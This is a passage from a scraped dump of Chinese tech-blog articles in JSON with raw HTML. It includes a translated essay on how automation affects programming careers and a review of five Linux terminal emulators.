Hyper-V一起使用时很好的选择。你可以很轻松地在虚拟环境里模拟一个live环境以提高测试效率，或者你也可以为live环境创建一个虚拟备份以备后用。</p>\n<p>Disk2vhd用起来很简单，你就是要输入要保存的VHD文件的文件名和保存位置，还要指定要包含的卷，然后点击“创建”。你也可以通过Disk2vhd内置的命令行选项来创建。</p>\n<p><a href=\"http://hyperv.veeam.com/how-to-convert-physical-machine-hyper-v-virtual-machine-disk2vhd/\" target=\"_blank\">如何使用Disk2vhd？</a></p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113133\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113133votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113133\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 6 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 1 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_img_path": "full/f95e08dd3d51965b10609d97356841122070a18b.jpg"}
{"url_object_id": "4f618c983b25ffff16b2f08257be1136", "title": "自动化来势汹汹，未来的程序员该何去何从？", "url": "http://blog.jobbole.com/113147/", "create_date": "2017/11/30", "front_img_url": ["http://jbcdn2.b0.upaiyun.com/2012/08/programmer-developer-at-work.jpg"], "praise_nums": 1, "comment_nums": 4, "favor_nums": 4, "tags": "职场,程序员,自动化", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"https://medium.com/@TebbaVonMathenstien/are-programmers-headed-toward-another-bursting-bubble-528e30c59a0e\">Tebba Von Mathenstien</a>   译文出处：<a target=\"_blank\" href=\"https://36kr.com/p/5105109.html\">36氪</a>   </div><p>【编者按】：AI、自动化，这些技术进步不仅威胁到到了其他行业的工作，甚至有声音认为，连开发这些技术的程序员其自嘲的“码农”地位都将不保。比方说，OpenAI 前研究科学家 Andrej Karpathy 就<a href=\"https://36kr.com/p/5103242.html\" target=\"_self\">认为</a>，在AI引领的软件2.0趋势下，传统程序员真的有可能要失业了。不过，跟 Tyler Elliot Bettilyon 相比，这些都是对程序员未来的片面看法，相对而言，他对程序员未来的工作前景分析更加全面客观，值得从业者好好<a href=\"https://medium.com/@TebbaVonMathenstien/are-programmers-headed-toward-another-bursting-bubble-528e30c59a0e\" target=\"_self\">看看</a>，思考未来作何选择。</p>\n<p>我的一位朋友最近提出了一个问题，这样的问题我在不同场合都听说过，只是形式各不相同：</p>\n<blockquote><p>你是否认为IT和一些低端的编程工作会重蹈渡渡鸟的覆辙？看起来一场大规模的就业泡沫似乎就要破裂了。在我看来，技术和低端计算机科学相关工作之所以还“久负盛名”并且拿到不菲的报酬的其中一个原因，是那些荒谬的行话以及公众对计算机的无知，但这两个在未来10年都会消失……</p></blockquote>\n<p>这个问题同时指向了两点，一是技术工作的未来，二是对软件工程领域的普遍误解。虽说有大量“荒谬的行话”没错，但是还有同样多的困难问题等着那帮有着合适技能组合的人去解决也是事实。一些软件工作绝对是要消失的，但在很多年的时间里有着合适经验和知识的一些程序员仍然会继续享有声望并且拿到可观的报酬；作为例子可以看看最近AI研究人员薪水的爆发以及可用人才的相应短缺就知道了。</p>\n<p>在不断变化的技术业能够保持与时俱进是个挑战。通过审视取代现在哪些程序员的技术可以预测出市场的那些岗位会消失。此外，要想预测特定技能薪酬和需求变化我们应该考虑学习编程群体的壮大情况。就像Hannah指出“公众对计算机的无知”导致了那些会编程的人工资高企一样，大众对计算机的认知正在逐年变得更加娴熟。</p>\n<p><strong>日益走向商品化</strong></p>\n<p>对自动化取代工作的恐惧既不新鲜也不是杞人忧天。在任何领域，尤其是在技术领域，市场力量都会推动着企业朝着自动化和商品化发展。Gartner的炒作周期曲线就是对这一现象的很好诠释。</p>\n<p><span class=\"load-html-img loaded\"><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2017/11/ec63e35ba99dfacfddc63231e5ae5d2f.jpg\" alt=\"自动化来势汹汹，未来的程序员该何去何从？\" data-img-size-val=\"800,619\"></span></p>\n<p style=\"text-align: center;\">Gartner 2017炒作周期曲线</p>\n<p>随着时间延续，特定想法和技术把生产力推进到了“高原期”，最终实现自动化。但凡回顾历史就能得出结论，自动化是有能力摧毁特定的就业市场的。从作物收割到，到汽车装配，不同行业的技术发展正在不断替代和增强人类劳动力，降低成本。一位教授曾经在自己的编译器课程上总结说，“以史为鉴，看看纺织业和钢铁业：你是想建造机器和工具呢，还是想操作那些机器？”</p>\n<p>在这里“机器”的隐喻是指计算机编程语言。这位教授其实是问：你是想用JavaScript开发网站呢，还是想开发驱动JavaScript的<a href=\"https://github.com/v8/v8\" target=\"_self\">V8引擎</a>？</p>\n<p>网站的创建工作已经由WordPress等工具自动化了。而另一方面V8的竞争对手也越来越多，其中一些正在解决开放的研究问题。语言会来了又走（想想看现在还有多少分Fortran的工作？），但总会有人开发下一种编程语言。我们是幸运的，因为编程语言的实现也是用编程语言写的。作为软件的“机器操作者”把你推上了一条成为“机器制造者”的道路，这是过去的钢铁厂工人所没有走过的。</p>\n<p>语言、解译器以及编译器的不断增多向我们表明，每一台摧毁工作的机器也提供了对这些机器进行改进、维护等的新机遇。尽管消失的工作的列表正在变得越来越长，但是人类全体都认为“我想已经没有工作可以做的了”的那个历史性时刻还没有到来。</p>\n<p><span class=\"load-html-img loaded\"><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2017/11/aeda4039483d8093363233d4be04c23a.jpg\" alt=\"自动化来势汹汹，未来的程序员该何去何从？\" data-img-size-val=\"650,448\"></span></p>\n<p style=\"text-align: center;\">Pinsetters</p>\n<p>商品化会向我们所有人袭来，不仅仅只是软件工程师。在整个历史长河中，人类劳动力都在不断被非人类的东西取代或者增强，导致工作所需的人更少，对技能的要求更低。自动汽车和自动卡车只是这个伟大的人类传统的一时之兴。如果创造和自动化的周期是生活的现实，接下来我们自然要问：哪些工作和行业有危险，哪些又暂时无忧呢？</p>\n<p><strong>谁自动化谁？</strong></p>\n<p>AWS、Heroku等类似托管主机平台永久性地改变了系统管理员/DevOps工程师的角色。互联网企业过去绝对需要自己的服务器专家。其中一些精通Linux；一些懂得如何用Apache或者NGINX配置服务器；有的不仅会对服务器、路由器等各种物理组件进行布线，而且还懂配置路由表以及各种必要的软件来让服务器供大众在web上访问。尽管现在仍然有一群人懂得干这一行，但AWS正在令其中一些技能变得过时——尤其是对经验要求更低的一些事情以及硬件类的事情。对于灵通物理基础设施的人来说，Amazon（以及Netflix、Google等）内部还有非常赚钱的角色可以担任，但是中小企业方面对这些角色的需求已经大为减少。</p>\n<p>像SalesForce、Tableau以及SpotFire这样的“商业智能（BI）”工具正在开始占领历史上属于软件工程师的地盘。这些系统已经减少了对内部数据库管理员的需求，但作为一种通用技能同时也增加了对SQL的需求。BI还减少了对内部报表技术的需求，但增加了对“集成工程师”的需求，后者的工作是将来自企业的数据流交给第三方平台进行自动化处理。一度为Excel和电子表格所统治的数据管理领域正在逐步被推向Python或者R这样的脚本语言以及SQL上。一些工作会消失，但对能够写软件的人的需求总体上来说是增长的。</p>\n<p>就更接近软件而言，数据科学是商品化的一个很好的例子。Scikit.learn、Tensorflow以及PyTorch都是、方便大家编写机器学习软件的软件库。事实上，用同一个数据集跑许多有着不同参数集、同时赌气算法实现几乎一无所知的机器学习算法是有可能的（当然这么做是不明智的，这里只是说可能性）。我敢打赌未来几年商业智能公司会尝试将这些类型的算法集成到自己的工具里面。</p>\n<p>从很多方面来说数据科学就像5到8年前的web开发——这是一个蓬勃发展的领域，因为“技能鸿沟”，你能够获得的效果知识很少。后来，随着web开发训练营的关停整合，数据科学训练营又在原来的地方冒出来。收购了原来的web开发训练营（Dev Bootcamp）的Kaplan现在就是设立了一个数据科学训练营（Metis），并且决定关闭DevBootcamp，同时维持Metis的运转。</p>\n<p>内容管理系统是工具里面因为自动化而取消对软件工程师需求的最明显例子之一。SquareSpace和WordPress是当今最流行的CMS系统之一。这些平台显著降低了只有一点前端web开发技能的人的价值。事实上，做网站并把它放上网的门槛已经低了很多，低到毫无变成经验的人也能够每天都成功地发布新网站。这些人没法做出服务数十亿人的、交互性极强的网站，但是替自己的企业制作网站为客户提供所需信息绝对是可以的。一个可爱的登录页，再加上如何寻找公司、如何联络自己这样的信息对于当地饭店、酒吧或者零售店来说已经绰绰有余。</p>\n<p>如果你的企业不是以“互联网业务”为主，想弄个过得去的网站放到网上从来都没有像现在这么容易。因此，可迅速做好网站并放到网上的 web承包商产业一度欣欣向荣，但现在已经变得没那么赚钱了。</p>\n<p>最后，在这种情况下如果忽视计算机的物理方面的话这种态度近乎自大。用Mike Acton的话来说：“软件不是平台，硬件才是平台”。搞软件的人至少要学习一点计算机体系结构和电气工程的知识才算是明智的。硬件的一次大动荡，消比如费者级的量子计算机的出现将会改变软件工程的一切。</p>\n<p>量子计算机仍然还有很长一段路要走，但对GPU的兴趣在增加，同时朝着并行化的方向发展是即将到来的转变。 CPU的速度近几年来一直停滞不前，而在当时，对机器学习和“大数据”的渴望似乎已经达到无可遏止的地步。随着对大型数据集的处理需求与日俱增，OpenMP，OpenCL，Go，CUDA等其他并行处理语言和框架将继续成为主流。为了在短期内快速提高竞争力，显著并行化将成为全面需求，而不仅仅局限在高性能的小众应用领域，比如操作系统，基础设施以及视频游戏等。</p>\n<p><strong>人人都在学编码</strong></p>\n<p>网站无所不在。<a href=\"https://insights.stackoverflow.com/survey/2017#company-type\" target=\"_self\">2017 Stack Overflow调查报告</a>指出，约15%的专业软件工程师正在“互联网/Web服务”公司工作。美国劳工部预计Web开发的增长率比平均岗位需求增长速度高很多的情况仍将继续（<a href=\"https://www.bls.gov/ooh/computer-and-information-technology/web-developers.htm\" target=\"_self\">2014年到2024年间为24%</a>）。鉴于其可视性，这个行业很大一部分的关注点都会落在“填补技能鸿沟”上面。编码训练营几乎只教Web开发，而Udemy、Udacity以及Coursera等类似市场上也充斥着Web开发的课程。</p>\n<p>整个Web开发技术栈的自动化程度越来越高，入门级的新程序员大量涌入Web开发领域，这导致部分人预测软件开发人员将会面临一个<a href=\"https://www.wired.com/2017/02/programming-is-the-new-blue-collar-job/\" target=\"_self\">“蓝领”市场</a>。有的人甚至更加激进一点，认为把这个产业推向蓝领市场是大型科技公司设计的战略。当然，其他人会说我们正朝着又一次泡沫破裂进发。</p>\n<p>对特定技术需求的变化已经不是新闻。技术的语言和框架总是会有此消彼长的情况。Web开发目前的化身（“JS为王”）的走势最终会像2000年代早期的Web开发走势一样（还记得Flash吗？）所不同的是，这次在当今流行的web开发框架上很多人都有着明确（且主要）的教育经历。在你决定给自己贴上“React开发者”标签之前，请记住曾经有人自认为是“Flash开发者”。如果把你的职业生涯吊死在一种语言、框架或者技术上无异于玩轮盘赌游戏。当然，要预测哪些技术还将继续发展下去是相当困难的，但是如果你打算找个东西全力以赴的话，我建议可以按照Lindy效应（对易损的东西来说，每多活一天，都会缩短其寿命；相反的，对于不易损的东西来说，每多活一天，都将更拉长其存在寿命。）选出一些已经经受住了时间考验的语言，比如C语言。</p>\n<p>下一代人将具备一种事实上的技术素养水平，这是X世代乃至千禧世代所不具备的。其结果之一是，这些人将会使用下一代的CMS工具。这些工具会变得更好，年轻的工作者也会用得更好会更好地使用它们。随着充满渴望技能熟练的年轻人进入就业市场，这两个因素的结合绝对会降低低水平的IT和web开发技能的价值。高中也在迎头赶上，开始提供计算机科学和编程课程，一些受过良好教育的高中学生一旦毕业可能就会马上以编程实习生的身份加入劳动大军。</p>\n<p>另外一大群的新人是MBA和数据分析师。一度由Excel主宰的岗位列表正在开始把SQL列为“具备更好”，甚至变成了“岗位要求”。诸如Tableau，SpotFire，SalesForce等基于Web的指标体系在继续取代电子表格作为报表生成主要工具的地位。如果这种情况持续下去，更多的数据分析师将会开始学习如何直接使用SQL，因为这要比把数据导出到电子表格更加简单。</p>\n<p>想要超越同行在职场继续往上爬的人正在网上学习数据库和统计变成语言方面的课程。有了这些新技能之后，通过机器学习和统计库的学习，他们就可以把自己定位成数据科学家了。走这条路的话看看Metis的课程就是很好的例子。</p>\n<p>最后，获得计算机科学和软件工程学位的人数在不断攀升。比如说，普渡大学报告说，其计算机课程课程的申请量在5年间已经翻了一番。康奈尔大学的计算机科学毕业生也出现了类似的爆发式增长。鉴于软件的发展和普及，这种趋势并不令人惊讶。年轻人很难会想象出计算机在我们的未来发挥的作用会越来越小，所以为什么不去学习一些能提供工作保障的东西呢。</p>\n<p><strong>稀有与期望</strong></p>\n<p>现在这个行业的一个普遍的观点是，你在大学四年计算机科学课程中受到的教育大多是不必要的东西。我已经多次在编程训练营的大厅里，web开发商店里听到过这样的说法，甚至像Eric Elliott这样的业界知名人物都<a href=\"https://medium.com/javascript-scene/want-to-code-a-university-degree-might-be-a-huge-waste-of-time-81e1817a2ef0\" target=\"_self\">这么说</a>。不过反方意见也很流行，有的甚至说“<a href=\"https://qz.com/414542/why-programmers-should-get-a-masters-degree/\" target=\"_self\">所有的程序员都应该拿到硕士学位</a>”。</p>\n<p>我的观点跟Eric Elliott一样，我认为学习编程应该有更多的选择，而4年的学位未必许多人的最佳选择。同时，我也同意William Bain的观点，即跨编程领域的基础技能对职业寿命至关重要，但是除了大学课程，目前你很难在其他地方找到这些信息。我曾经写过，作为长期职业生涯的基础，有抱负的工程师应该学习什么样的技能，并且解释了为了帮助分享这些知识，我加入了Bradfield。</p>\n<p>不同形态和规模的编码学校正变得愈发的无处不在，这里面有很好的理由。你不用了解大O符号、晦涩的数据结构以及算法细节也能学习编程。然而，尽管斯坦福大学的新鲜热辣的毕业生确实也能跟刚出Hack Reactor出来的人竞争一些工作，但这种情况只在一个或两个子行业中出现。编码学校和训练营的毕业生还没有申请嵌入式系统、密码/安全、机器人、网络基础设施或人工智能研究和开发方面的工作。但这些领域就像web开发一样正在迅速发展。</p>\n<p>一些与编程相关的技能已经开始从“稀有技能”向“基准期望”过渡。相反，建立像AWS这样强悍的引擎的工作已经非常普遍的。推动技术发展的大公司——比如Amazon、Google、Facebook、Nvidia以及Space-X等——通常不会找“对JavaScript有基本了解”的人。 AWS每天为数十亿用户提供服务。为了支撑这种载荷量，AWS基础设施工程师需要对网络协议、计算机架构有深入的了解，并且要有多年的相关经验。就像任何学科一样，这里面有业余爱好者和工匠之别。</p>\n<p>这些知名企业正在解决研究问题开发真正建立真正开拓能力疆界的系统。然而，即使在基本的编程技能越来越普遍的情况下，他们仍然很难填补其中的空缺。可以编写算法来预测基因序列变化从而带来想要结果的人在未来将会非常值钱。可以对卫星、航天器和机械自动化编程的人将继续受到高度重视。这些领域并不适合采取前端web开发那种“3个月密集学习计划”的人才速成，至少还没有像样的成功先例。</p>\n<p>因为计算机科学开头是“计算机”这个词，所以我们可以认为，到2025年，所有的年轻人天生就能理解计算机。不幸的是，计算机的普及并没有造就对数学、计算机科学、网络基础设施、电气工程等有着事实上的了解的新一代人。会用计算机跟计算研究是不一样的。尽管数学自创始伊始就已经存在，但十分精通统计学的人仍然相对较少，而计算机科学也是一样的陈旧。 Euclid发明了好几种算法，其中之一是在每次发出HTTPS请求时使用；每次我们登录网站都要用HTTPS这一事实并不会自动让任何人了解这些协议是如何工作的。</p>\n<p><strong>双峰工资分布</strong></p>\n<p>更成熟的专业领域往往会有双峰的工资分布模式：相对较少的从业人员赚走了相当多的钱，其中大多数人的工资都不错，但并没有处在前1%之列。美国全国法律就业组织收集的数据可以十分清晰地反映出这一现象。大部分法学毕业生的工资在45000美元到65000美元之间，这是很高的工资了，但很难跟“顶尖专业人士”联系在一起。</p>\n<p><span class=\"load-html-img loaded\"><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2017/11/82e94b917a7e5639fb5b2459b453fbf2.jpg\" alt=\"自动化来势汹汹，未来的程序员该何去何从？\" data-img-size-val=\"800,582\"></span></p>\n<p style=\"text-align: center;\">法律专业的工资分布情况</p>\n<p>我们往往会认为，所有的法律毕业生都有可能成为一家律师事务所的合伙人，但事实上他们有很多条路可以走：律师助理，文员，公设辩护人，法官，企业法律服务，合同写作等等。计算机科学专业的毕业生也有很多选择，从Web开发到嵌入式系统不等。基本的编程技能会继续成为一种期望，而不是“锦上添花”，我怀疑编程工作也会出现类似的分布情况。</p>\n<p>尽管还会有一批程序员靠着不断推进技术极限而赚到很多的钱，但是为新的以计算机为中心的经济提供动力的中级程序员队伍将会越来越壮大。Web开发人员的平均工资肯定会随着时间的推移而下降。说虽如此，但我怀疑“程序员”的岗位总量只会继续增长。随着人工的供给侧开始满足需求，希望我们将看到各种中级编程工作将会出现有益的繁荣。对于那些正在开辟无限可能的程序员来说，他们还将继续拿到顶级的职业工资。</p>\n<p>不管你是属于哪一类的程序员，从事技术行业意味着终生都要继续教育。如果你想成为第二类程序员，你就得加大投入，去学习如何创造机器，而不仅仅是使用机器。</p>\n<p> </p>\n<p> </p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113147\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113147votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113147\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 4 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 4 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_img_path": "full/bb38d11fb4038702790e0370ed966c50f186ff40.jpg"}
{"url_object_id": "71754c69c41b20b379b2bc4a00851aee", "title": "5 款最酷的 Linux 终端模拟器", "url": "http://blog.jobbole.com/113109/", "create_date": "2017/11/27", "front_img_url": ["http://jbcdn2.b0.upaiyun.com/2017/05/77d80105fd15f2465894827e23cc4842.jpeg"], "praise_nums": 1, "comment_nums": 0, "favor_nums": 0, "tags": "IT技术,Linux", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"https://www.linux.com/learn/intro-to-linux/2017/11/5-coolest-linux-terminal-emulators\">Carla Schroder</a>   译文出处：<a target=\"_blank\" href=\"https://linux.cn/article-9085-1.html\">Linux中国/ChenW</a>   </div><p>虽然，我们可以继续使用老旧的 GNOME 终端、Konsole，以及好笑而孱弱的旧式 xterm。 不过，让我们带着尝试某种新东西的心境，回过头来看看 5 款酷炫并且实用的 Linux 终端。</p>\n<h3 id=\"toc_1\">Xiki</h3>\n<p>首先我要推荐的第一个终端是 <a href=\"http://xiki.org/\">Xiki</a>。 Xiki 是 Craig Muth 的智慧结晶，他是一个天才程序员，也是一个有趣的人（有趣在此处的意思是幽默，可能还有其它的意思）。 很久以前我在 <a href=\"https://www.linux.com/learn/meet-xiki-revolutionary-command-shell-linux-and-mac-os-x\">遇见 Xiki，Linux 和 Mac OS X 下革命性命令行 Shell</a> 一文中介绍过 Xiki。 Xiki 不仅仅是又一款终端模拟器；它也是一个扩展命令行用途、加快命令行速度的交互式环境。</p>\n<p>Xiki 支持鼠标，并且在绝大多数命令行 Shell 上都支持。 它有大量的屏显帮助，而且可以使用鼠标和键盘快速导航。 它体现在速度上的一个简单例子就是增强了 <code>ls</code> 命令。 Xiki 可以快速穿过文件系统上的多层目录，而不用持续的重复输入 <code>ls</code> 或者 <code>cd</code>， 或者利用那些巧妙的正则表达式。</p>\n<p>Xiki 可以与许多文本编辑器相集成， 提供了一个永久的便签， 有一个快速搜索引擎， 同时像他们所说的，还有许许多多的功能。 Xiki 是如此的有特色、如此的不同， 所以学习和了解它的最快的方式可以看 <a href=\"http://xiki.org/screencasts/\">Craig 的有趣和实用的视频</a>。</p>\n<h3 id=\"toc_2\">Cool Retro Term</h3>\n<p>我推荐 <a href=\"https://github.com/Swordfish90/cool-retro-term\">Cool Retro Term</a>  主要因为它的外观，以及它的实用性。 它将我们带回了阴极射线管显示器的时代，这不算很久以前，而我也没有怀旧的意思，我死也不会放弃我的 LCD 屏幕。它基于 <a href=\"https://www.linux.com/learn/expert-tips-and-tricks-kate-and-konsole\">Konsole</a>， 因此有着 Konsole 的优秀功能。可以通过 Cool Retro Term 的配置文件菜单来改变它的外观。配置文件包括 Amber、Green、Pixelated、Apple 和 Transparent Green 等等，而且全都包括一个像真的一样的扫描线。并不是全都是有用的，例如 Vintage 配置文件看起来就像一个闪烁着的老旧的球面屏。</p>\n<p>Cool Retro Term 的 GitHub 仓库有着详细的安装指南，且 Ubuntu 用户有 <a href=\"https://launchpad.net/%7Ebugs-launchpad-net-falkensweb/+archive/ubuntu/cool-retro-term\">PPA</a>。</p>\n<h3 id=\"toc_3\">Sakura</h3>\n<p>你要是想要一个优秀的轻量级、易配置的终端，可以尝试下 <a href=\"https://bugs.launchpad.net/sakura\">Sakura</a>（图 1）。 它依赖少，不像 GNOME 终端 和 Konsole，在 GNOME 和 KDE 中牵扯了很多组件。其大多数选项是可以通过右键菜单配置的，例如选项卡的标签、 颜色、大小、选项卡的默认数量、字体、铃声，以及光标类型。 你可以在你个人的配置文件 <code>~/.config/sakura/sakura.conf</code> 里面设置更多的选项，例如绑定快捷键。</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2017/11/ecd5b6fd6631028ddb4549f056f96f11.png\" alt=\"sakura\"></p>\n<p style=\"text-align: center\"><em>图 1： Sakura 是一个优秀的、轻量级的、可配置的终端。</em></p>\n<p>命令行选项详见 <code>man sakura</code>。可以使用这些来从命令行启动 sakura，或者在你的图形启动器上使用它们。 例如，打开 4 个选项卡并设置窗口标题为 “MyWindowTitle”：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a634cc6ea5ed916322519\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ sakura -t MyWindowTitle -n 4\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a634cc6ea5ed916322519-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc6ea5ed916322519-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a634cc6ea5ed916322519-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">sakura</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">t</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">MyWindowTitle</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">n</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">4</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc6ea5ed916322519-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p></p>\n<h3 id=\"toc_4\">Terminology</h3>\n<p><a href=\"https://www.enlightenment.org/about-terminology\">Terminology</a> 来自 Enlightenment 图形环境的郁葱可爱的世界，它能够被美化成任何你所想要的样子 (图 2)。 它有许多有用的功能：独立的拆分窗口、打开文件和 URL、文件图标、选项卡，林林总总。 它甚至能运行在没有图形界面的 Linux 控制台上。</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2017/11/e329af757fc05ab507eeb422e4f73b7f.png\" alt=\"Terminology\"></p>\n<p style=\"text-align: center\"><em>图 2: Terminology 也能够运行在没有图形界面的 Linux 控制台上。</em></p>\n<p>当你打开多个拆分窗口时，每个窗口都能设置不同的背景，并且背景文件可以是任意媒体文件：图像文件、视频或者音乐文件。它带有一堆便于清晰可读的暗色主题和透明主题，它甚至一个 Nyan 猫主题。它没有滚动条，因此需要使用组合键 <code>Shift+PageUp</code> 和 <code>Shift+PageDown</code> 进行上下导航。</p>\n<p>它有多个控件：一个右键单击菜单，上下文对话框，以及命令行选项。右键单击菜单里包含世界上最小的字体，且 Miniview 可显示一个微观的文件树，但我没有找到可以使它们易于辨读的选项。当你打开多个标签时，可以点击小标签浏览器来打开一个可以上下滚动的选择器。任何东西都是可配置的；通过 <code>man terminology</code> 可以查看一系列的命令和选项，包括一批不错的快捷键快捷方式。奇怪的是，帮助里面没有包括以下命令，这是我偶然发现的：</p>\n<ul>\n<li>tyalpha</li>\n<li>tybg</li>\n<li>tycat</li>\n<li>tyls</li>\n<li>typop</li>\n<li>tyq</li>\n</ul>\n<p>使用 <code>tybg [filename]</code> 命令来设置背景，不带参数的 <code>tybg</code> 命令来移除背景。 运行 <code>typop [filename]</code> 来打开文件。 <code>tyls</code> 命令以图标视图列出文件。 加上 <code>-h</code> 选项运行这些命令可以了解它们是干什么的。 即使有可读性的怪癖，Terminology 依然是快速、漂亮和实用的。</p>\n<h3 id=\"toc_5\">Tilda</h3>\n<p>已经有几个优秀的下拉式终端模拟器，包括 Guake 和 Yakuake。 <a href=\"https://github.com/lanoxx/tilda\">Tilda</a> (图 3) 是其中最简单和轻量级的一个。 打开 Tilda 后它会保持打开状态， 你可以通过快捷键来显示和隐藏它。 Tilda 快捷键是默认设置的， 你可以设置自己喜欢的快捷键。 它一直打开着的，随时准备工作，但是直到你需要它的时候才会出现。</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2017/11/90389bcf4fc2b50a585a3f3435576a34.png\" alt=\"\"></p>\n<p style=\"text-align: center\"><em>图 3: Tilda 是最简单和轻量级的一个终端模拟器。</em></p>\n<p>Tilda 选项方面有很好的补充，包括默认的大小、位置、外观、绑定键、搜索条、鼠标动作，以及标签条。 这些都被右键单击菜单控制。</p>\n<p><em>学习更多关于 Linux 的知识可以通过 Linux 基金会 和 edX 的免费课程 <a href=\"https://training.linuxfoundation.org/linux-courses/system-administration-training/introduction-to-linux\">“Linux 介绍” </a>。</em></p>\n\r\n        \r\n        